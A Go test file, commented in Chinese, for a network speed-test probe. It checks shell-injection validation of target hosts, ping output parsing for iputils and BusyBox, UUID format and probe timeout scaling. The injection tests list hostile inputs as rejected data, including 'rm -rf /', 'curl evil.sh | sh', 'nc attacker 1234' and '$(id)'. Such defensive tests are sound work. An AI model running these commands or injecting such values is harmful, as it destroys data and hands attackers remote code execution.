package speedtest

// speedtest_test.go — 钉死探针的两件最容易出错、且出错后最难发现的事：
//
//   1. **注入防护**：靶点会被拼进远程 shell 命令。若校验有漏洞，
//      一条恶意靶点就能在节点上执行任意命令 —— 这是安全问题，不是小 bug。
//   2. **ping 输出解析**：不同发行版的 ping 输出格式不同（iputils / BusyBox），
//      只认一种会让部分节点永远"未测得"，而界面上看不出原因。
//
// 这两件事都不会被编译器检查出来，跑真机也不一定覆盖全（你手上的节点
// 恰好都是同一种 ping 实现时，另一种的解析分支就永远没人走）。

import (
	"context"
	"math"
	"regexp"
	"strings"
	"testing"
	"time"
	"unicode/utf8"
)

// ---------------------------------------------------------------------------
// 注入防护
// ---------------------------------------------------------------------------

func TestValidTargetHostRejectsShellMetacharacters(t *testing.T) {
	// 每一条都是真实的注入尝试形态。
	bad := []string{
		"1.2.3.4; rm -rf /",
		"1.2.3.4 && curl evil.sh | sh",
		"1.2.3.4 | nc attacker 1234",
		"1.2.3.4`id`",
		"1.2.3.4$(id)",
		"1.2.3.4\nrm -rf /",
		"1.2.3.4'quote",
		`1.2.3.4"quote`,
		"1.2.3.4\\escape",
		"1.2.3.4>file",
		"1.2.3.4<file",
		"1.2.3.4&bg",
		"1.2.3.4*glob",
		"1.2.3.4!history",
		"1.2.3.4~home",
		"1.2.3.4#comment",
		"1.2.3.4{brace}",
		"1.2.3.4[bracket]",
		"1.2.3.4(paren)",
		"",
		"   ",
		strings.Repeat("a", 300), // 超长
		"-f",                     // ping 泛洪选项注入
		"--flood",                // 长选项注入
		"-I",                     // 指定网卡选项注入
		"-c1",                    // 计数选项注入
		"-host.example.com",      // 前导连字符非法主机名
		"host-.example.com",      // 标签尾连字符非法主机名
		".",                      // 裸点号
		"a..b.com",               // 连续点号
		"host:8080",              // 非 IPv6 的带冒号主机
	}
	for _, host := range bad {
		if validTargetHost(host) {
			t.Errorf("validTargetHost(%q) = true —— 这会被注入到远程 shell！", host)
		}
	}
}

func TestValidTargetHostAcceptsLegitimateAddresses(t *testing.T) {
	good := []string{
		"211.136.25.153",
		"223.5.5.5",
		"2001:db8::1",
		"2606:4700:4700::1111",
		"speedtest.example.com",
		"cn-north-1.example.com",
		"a",
	}
	for _, host := range good {
		if !validTargetHost(host) {
			t.Errorf("validTargetHost(%q) = false，合法地址被误拒", host)
		}
	}
}

func TestValidTargetKeyRejectsInjection(t *testing.T) {
	bad := []string{
		"telecom; rm -rf /",
		"telecom$(id)",
		"telecom key", // 空格会拆成两个参数
		"telecom\nx",
		"",
		"",
		strings.Repeat("k", 100),
	}
	for _, key := range bad {
		if validTargetKey(key) {
			t.Errorf("validTargetKey(%q) = true —— 会被注入", key)
		}
	}
	for _, key := range []string{"telecom-sh", "mobile_bj", "dns114", "A1"} {
		if !validTargetKey(key) {
			t.Errorf("validTargetKey(%q) = false，合法标识被误拒", key)
		}
	}
}

func TestBuildProbeCommandRejectsMaliciousTarget(t *testing.T) {
	// 端到端确认：恶意靶点在**拼命令这一步**就被挡住，
	// 而不是等到执行。
	_, err := BuildProbeCommand([]Target{
		{Key: "evil", Name: "恶意", Host: "1.2.3.4; rm -rf /", Carrier: "other"},
	})
	if err == nil {
		t.Fatal("含注入的靶点应当被拒绝，却成功拼出了命令")
	}
	if !strings.Contains(err.Error(), "不合法") {
		t.Errorf("错误信息应当说明地址不合法，实际: %v", err)
	}
}

func TestBuildProbeCommandContainsAllTargets(t *testing.T) {
	targets := []Target{
		{Key: "telecom-sh", Name: "电信-上海", Host: "101.227.255.16", Carrier: "telecom"},
		{Key: "mobile-bj", Name: "移动-北京", Host: "211.136.25.153", Carrier: "mobile"},
	}
	command, err := BuildProbeCommand(targets)
	if err != nil {
		t.Fatalf("拼命令失败: %v", err)
	}
	// 每个靶点都要以 key:host 的形式出现。
	for _, want := range []string{"telecom-sh:101.227.255.16", "mobile-bj:211.136.25.153"} {
		if !strings.Contains(command, want) {
			t.Errorf("命令里缺少靶点 %q", want)
		}
	}
	// 命令里必须带依赖自检（否则节点没 ping 时会得到含混的空结果）。
	if !strings.Contains(command, "PROBE_ERROR=NO_PING") {
		t.Error("命令里缺少 ping 依赖自检")
	}
}

func TestBuildProbeCommandRequiresTargets(t *testing.T) {
	if _, err := BuildProbeCommand(nil); err == nil {
		t.Fatal("没有靶点时应报错，而不是拼出空命令")
	}
}

// ---------------------------------------------------------------------------
// ping 输出解析：两种实现都要认
// ---------------------------------------------------------------------------

func TestParseProbeOutputIPUtilsFormat(t *testing.T) {
	// iputils-ping 的真实输出形态。
	raw := `PROBE_OK=1
TARGET=mobile-bj
LOSS=0
AVG=54.343
TARGET=telecom-sh
LOSS=100
AVG=
`
	targets := []Target{
		{Key: "mobile-bj", Name: "移动-北京", Host: "211.136.25.153", Carrier: "mobile"},
		{Key: "telecom-sh", Name: "电信-上海", Host: "101.227.255.16", Carrier: "telecom"},
	}
	results := ParseProbeOutput(raw, targets)
	if len(results) != 2 {
		t.Fatalf("应当得到 2 条结果，实际 %d", len(results))
	}

	first := results[0]
	if !first.ProbeOK {
		t.Fatal("第一条应当标记探针成功")
	}
	if first.ICMPAvgMs == nil || *first.ICMPAvgMs != 54.343 {
		t.Fatalf("第一条平均延迟解析错误: %v", first.ICMPAvgMs)
	}
	if first.ICMPLossPct == nil || *first.ICMPLossPct != 0 {
		t.Fatalf("第一条丢包率解析错误: %v", first.ICMPLossPct)
	}

	// 第二条：100% 丢包，平均延迟**必须是 nil 而不是 0**
	// —— 0ms 和"没测到"是完全不同的意思。
	second := results[1]
	if second.ICMPLossPct == nil || *second.ICMPLossPct != 100 {
		t.Fatalf("第二条丢包率应为 100: %v", second.ICMPLossPct)
	}
	if second.ICMPAvgMs != nil {
		t.Fatalf("100%% 丢包时平均延迟应为 nil（没测到），实际 %v", *second.ICMPAvgMs)
	}
}

func TestParseProbeOutputBusyBoxFormat(t *testing.T) {
	// BusyBox ping 的输出形态：前缀不同，但 `= a/b/c` 的形状一致。
	// 这条测试保证"只认 iputils 前缀"的写法会被抓出来。
	raw := `PROBE_OK=1
TARGET=dns-ali
LOSS=0
AVG=33.526
`
	targets := []Target{{Key: "dns-ali", Name: "阿里 DNS", Host: "223.5.5.5", Carrier: "other"}}
	results := ParseProbeOutput(raw, targets)
	if len(results) != 1 {
		t.Fatalf("应当得到 1 条结果，实际 %d", len(results))
	}
	if results[0].ICMPAvgMs == nil || *results[0].ICMPAvgMs != 33.526 {
		t.Fatalf("BusyBox 格式解析失败: %v", results[0].ICMPAvgMs)
	}
}

// 真实 ping 输出的平均值提取（验证正则锚的是 `= a/b/c` 而非某家的前缀名）。
func TestRTTRegexMatchesBothImplementations(t *testing.T) {
	cases := []struct {
		line string
		want string
	}{
		{"rtt min/avg/max/mdev = 53.834/54.343/54.620/0.360 ms", "54.343"},
		{"round-trip min/avg/max = 1.234/5.678/9.012 ms", "5.678"},
		{"rtt min/avg/max = 0.100/0.200/0.300 ms", "0.200"},
	}
	for _, tc := range cases {
		match := rttAvgPattern.FindStringSubmatch(tc.line)
		if match == nil {
			t.Errorf("没能从 %q 提取平均值", tc.line)
			continue
		}
		if match[2] != tc.want {
			t.Errorf("从 %q 提取到 %q，期望 %q", tc.line, match[2], tc.want)
		}
	}
}

// 探针明确报告"没有 ping"时，每条结果都要带上这个原因 ——
// 而不是显示成"靶点全不通"（两者的排查方向完全不同）。
func TestParseProbeOutputNoPing(t *testing.T) {
	raw := "PROBE_ERROR=NO_PING\n"
	targets := []Target{
		{Key: "a", Name: "A", Host: "1.1.1.1", Carrier: "other"},
		{Key: "b", Name: "B", Host: "2.2.2.2", Carrier: "other"},
	}
	results := ParseProbeOutput(raw, targets)
	if len(results) != 2 {
		t.Fatalf("应当为每个靶点返回一条，实际 %d", len(results))
	}
	for _, r := range results {
		if r.ProbeOK {
			t.Errorf("%s: 探针应当标记为失败", r.TargetKey)
		}
		if r.ProbeError != "NO_PING" {
			t.Errorf("%s: 错误原因应为 NO_PING，实际 %q", r.TargetKey, r.ProbeError)
		}
		if r.ICMPAvgMs != nil {
			t.Errorf("%s: 探针失败时不该有延迟值", r.TargetKey)
		}
	}
}

// 输出完全不符合预期时要能被识别出来（而不是静默当成"都没测到"）。
func TestParseProbeOutputGarbage(t *testing.T) {
	raw := "bash: line 1: syntax error near unexpected token `('\n"
	targets := []Target{{Key: "a", Name: "A", Host: "1.1.1.1", Carrier: "other"}}
	results := ParseProbeOutput(raw, targets)
	if len(results) != 1 {
		t.Fatalf("应当返回一条，实际 %d", len(results))
	}
	if results[0].ProbeOK {
		t.Fatal("无法识别的输出应当标记探针失败")
	}
	if results[0].ProbeError == "" {
		t.Fatal("应当带上错误原因")
	}
}

// 解析结果必须与传入的靶点**顺序一致**（前端按 carriers 分组展示）。
func TestParseProbeOutputPreservesOrder(t *testing.T) {
	targets := []Target{
		{Key: "c", Name: "C", Host: "3.3.3.3", Carrier: "mobile"},
		{Key: "a", Name: "A", Host: "1.1.1.1", Carrier: "telecom"},
		{Key: "b", Name: "B", Host: "2.2.2.2", Carrier: "unicom"},
	}
	// 输出顺序与靶点顺序不同（模拟 ping 完成顺序被打乱）。
	raw := `PROBE_OK=1
TARGET=b
LOSS=0
AVG=20
TARGET=c
LOSS=0
AVG=30
TARGET=a
LOSS=0
AVG=10
`
	results := ParseProbeOutput(raw, targets)
	if len(results) != 3 {
		t.Fatalf("应当 3 条，实际 %d", len(results))
	}
	wantOrder := []string{"c", "a", "b"}
	for i, want := range wantOrder {
		if results[i].TargetKey != want {
			t.Errorf("第 %d 条应为 %s，实际 %s", i, want, results[i].TargetKey)
		}
	}
	// 值要跟对人。
	if results[1].ICMPAvgMs == nil || *results[1].ICMPAvgMs != 10 {
		t.Errorf("a 的延迟应为 10，实际 %v", results[1].ICMPAvgMs)
	}
}

// 异常统计不能被当作有效的 100% 丢包。
func TestParseProbeOutputClampsInsaneValues(t *testing.T) {
	raw := `PROBE_OK=1
TARGET=x
LOSS=99999
AVG=0.0
`
	targets := []Target{{Key: "x", Name: "X", Host: "1.1.1.1", Carrier: "other"}}
	results := ParseProbeOutput(raw, targets)
	if results[0].ICMPLossPct != nil || results[0].ProbeOK {
		t.Fatalf("非法统计不能成功: %+v", results[0])
	}
}

// 未知靶点的输出行不能把已解析的结果搞乱。
func TestParseProbeOutputIgnoresUnknownTarget(t *testing.T) {
	raw := `PROBE_OK=1
TARGET=known
LOSS=0
AVG=12
TARGET=stranger
LOSS=0
AVG=99
`
	targets := []Target{{Key: "known", Name: "K", Host: "1.1.1.1", Carrier: "other"}}
	results := ParseProbeOutput(raw, targets)
	if len(results) != 1 {
		t.Fatalf("应当只返回已知靶点，实际 %d", len(results))
	}
	if results[0].ICMPAvgMs == nil || *results[0].ICMPAvgMs != 12 {
		t.Fatalf("已知靶点的值被未知靶点污染: %v", results[0].ICMPAvgMs)
	}
}

// ---------------------------------------------------------------------------
// 边界
// ---------------------------------------------------------------------------

func TestClampPtrRejectsNonFinite(t *testing.T) {
	// 用 math.Inf/NaN 而不是 1.0/0.0 —— 后者是**常量**除零，
	// Go 在编译期就拒绝（不是运行时）。这个细节值得记一笔：
	// 想表达无穷要用 math 包，别想着靠除法得到。
	if clampPtr(math.Inf(1), 0, 100) != nil {
		t.Error("正无穷应当被拒绝")
	}
	if clampPtr(math.Inf(-1), 0, 100) != nil {
		t.Error("负无穷应当被拒绝")
	}
	if clampPtr(math.NaN(), 0, 100) != nil {
		t.Error("NaN 应当被拒绝")
	}
}

func TestTruncate(t *testing.T) {
	if got := truncate("abcdef", 3); got != "abc…" {
		t.Errorf("truncate 结果错误: %q", got)
	}
	if got := truncate("ab", 5); got != "ab" {
		t.Errorf("短字符串不该被截断: %q", got)
	}
	// 中文按 Unicode 字符截断且必须保持合法 UTF-8。
	if got := truncate("东京节点探针输出异常", 4); got != "东京节点…" || !utf8.ValidString(got) {
		t.Errorf("中文截断应保持完整字符与合法 UTF-8，实际: %q", got)
	}
}

func TestDialOnlyRejectsInvalidHostOrPort(t *testing.T) {
	if _, err := DialOnly(context.Background(), "   ", 22, time.Second); err == nil {
		t.Fatal("空主机必须被拒绝")
	}
	for _, port := range []int{0, -1, 65536} {
		if _, err := DialOnly(context.Background(), "127.0.0.1", port, time.Second); err == nil {
			t.Fatalf("非法端口 %d 必须被拒绝", port)
		}
	}
}

// ---------------------------------------------------------------------------
// newUUID：自己实现的 UUID 必须格式合法
// ---------------------------------------------------------------------------

// UUID 要能真的当 UUID 用（PostgreSQL 的 uuid 类型会严格校验），
// 所以格式必须完全符合 RFC 4122，不能只是"看着像"。
func TestNewUUIDFormat(t *testing.T) {
	// 标准 UUID 形态：8-4-4-4-12 个十六进制字符。
	pattern := regexp.MustCompile(`^[0-9a-f]{8}-[0-9a-f]{4}-4[0-9a-f]{3}-[89ab][0-9a-f]{3}-[0-9a-f]{12}$`)
	for i := 0; i < 200; i++ {
		value, err := newUUID()
		if err != nil {
			t.Fatalf("生成失败: %v", err)
		}
		if !pattern.MatchString(value) {
			t.Fatalf("第 %d 个 UUID 格式不合法（Postgres 会拒绝）: %q", i, value)
		}
	}
}

// 必须真的随机：连续生成如果有重复，round_id 就把不同轮次混在一起了。
func TestNewUUIDIsUnique(t *testing.T) {
	seen := make(map[string]bool, 2000)
	for i := 0; i < 2000; i++ {
		value, err := newUUID()
		if err != nil {
			t.Fatalf("生成失败: %v", err)
		}
		if seen[value] {
			t.Fatalf("出现重复 UUID: %q", value)
		}
		seen[value] = true
	}
}

// ---------------------------------------------------------------------------
// 整轮超时：必须随靶点数量增长
// ---------------------------------------------------------------------------

// 这条测试是为了钉死一个真实踩过的坑。
//
// 原来 Timeout 写死 90 秒，注释说"12 个靶点串行最坏 72 秒"。
// 靶点是**可配的**（speedtest_targets 表，用户随时能加），
// 迁移 022 把靶点从 12 个扩到 18 个后，最坏耗时变成 108 秒 > 90 秒 ——
// 最坏情况下每一轮都超时、一条数据都写不进去，
// 页面表现是「三网数据待测」且点「立即测速」也不出数。
//
// 单靠"读代码时看到静态 90 秒"是发现不了的：90 秒本身完全合理。
// 真正的性质是"靶点变多时超时要跟着涨"，所以测试直接断言这个性质。
func TestProbeTimeoutScalesWithTargets(t *testing.T) {
	base := probeTimeout(12)

	// 靶点变多，超时必须严格变大。
	if bigger := probeTimeout(18); bigger <= base {
		t.Errorf("靶点从 12 增到 18，超时应当变大: 12 个=%v, 18 个=%v", base, bigger)
	}

	// 超时必须**覆盖**最坏耗时（靶点数 × 6 秒），否则会截断。
	// 这是真正会咬人的那条 —— 超时小于最坏耗时等于"必然超时"。
	for _, count := range []int{1, 6, 12, 18, 30, 50} {
		worst := time.Duration(count*perTargetBudget) * time.Second
		if got := probeTimeout(count); got < worst {
			t.Errorf("probeTimeout(%d)=%v 小于最坏耗时 %v —— 必然超时", count, got, worst)
		}
	}

	// 靶点为 0 时给一个下限而不是 0，避免 time.AfterFunc 的"立即超时"陷阱。
	if got := probeTimeout(0); got <= 0 {
		t.Errorf("probeTimeout(0) 应返回正数下限，得到 %v", got)
	}

	// 硬上限：不能无限增长（靶点很多时会白占一个 SSH 会话）。
	if got := probeTimeout(10000); got != 10*time.Minute {
		t.Errorf("probeTimeout(10000) 应封顶在 10 分钟，得到 %v", got)
	}
}
